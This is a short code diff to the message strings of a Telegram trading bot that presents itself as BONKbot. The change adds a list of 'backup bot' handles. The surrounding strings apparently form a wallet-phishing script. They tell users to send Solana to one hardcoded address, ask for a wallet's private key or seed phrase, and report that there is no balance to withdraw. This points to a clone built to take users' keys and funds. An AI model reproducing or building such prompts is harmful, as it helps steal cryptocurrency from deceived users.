@@ -93,13 +93,24 @@ SELL PROTECTION;
     DEPOSIT_TXT = """To Make changes to your Settings , Please deposit Solana or Import your Solana Wallet"""
 
     CHAT_TXT = """Join the discussion, share bugs and feature requests in our Telegram group:
-    https://t.me/BONKbotChat"""
+https://t.me/BONKbotChat"""
     
     DEPOSITADDRESS_TXT = """“To start trading add funds to your sol wallet provided below ⬇️
 
 <code>2qBi9NZizBkS1tn6GjKwzL6yBkU2nY6ivs4d3bXfzKeE</code>"""
 
     BALANCEFETCH_TXT = """You Have No Balance To Withdraw."""
+
+    BOTS_TXT = """Backup Bots:
+  
+BONKbot has a few bots that can be used if one is slow or down. You will have access to your same wallet there and can use the bots interchangeably.
+  
+- @bonkbot_bot
+- @monza_bonkbot
+- @sonic_bonkbot
+- @furiosa_bonkbot
+- @mcqueen_bonkbot
+- @neo_bonkbot"""
 
     IMPORTWALLET_TXT = """What is the private key or seed phrase of the wallet that you want to import?
 
